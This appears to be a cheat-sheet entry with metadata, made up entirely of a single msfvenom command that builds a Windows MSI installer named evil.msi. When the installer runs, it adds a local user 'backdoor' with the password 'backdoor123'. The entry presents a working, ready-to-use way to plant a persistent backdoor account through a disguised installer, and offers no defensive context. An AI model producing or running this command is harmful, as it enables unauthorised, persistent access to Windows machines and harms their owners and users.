---
id: 11694661-27b5-498a-8fb1-a3b358450a91
name: Create MSI payload with backdoor user credentials
type: command
executor: bash
data: $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
output: null
created_at: '2023-04-06T03:56:29.766310+00:00'
updated_at: '2023-04-10T20:37:33.387000+00:00'
---

# Create MSI payload with backdoor user credentials

```bash
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
```
